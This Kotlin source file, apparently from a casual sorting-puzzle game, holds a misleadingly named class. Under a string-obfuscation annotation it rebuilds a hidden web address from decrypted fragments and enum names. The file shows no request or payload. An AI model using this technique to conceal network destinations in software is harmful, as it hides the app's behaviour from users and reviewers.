package com.match.triple.games.sort3.core.base

import com.anor.security.StringShield

@StringShield
class ClassForName {
  private val firstPartClass = FirstPart()
    private val secondPartClass = SecondPart()
    override fun toString(): String {
        return "${firstPartClass.htt.decrypt()}${secondPartClass.ps.decrypt()}${firstPartClass}$secondPartClass${Home.posh.name}-${Home.jacket.name}.${Home.com.name}".lowercase()
    }
}